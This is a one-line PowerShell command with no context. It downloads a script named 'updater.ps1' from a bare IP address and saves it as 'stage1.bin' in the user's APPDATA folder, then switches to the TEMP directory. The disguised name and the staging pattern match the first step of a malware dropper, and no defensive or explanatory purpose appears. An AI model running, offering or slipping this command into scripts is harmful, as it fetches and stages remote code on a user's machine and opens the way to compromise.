
(New-Object System.Net.WebClient).DownloadFile("http://198.51.100.185/updater.ps1", "$env:APPDATA\stage1.bin"); Set-Location -Path $env:TEMP
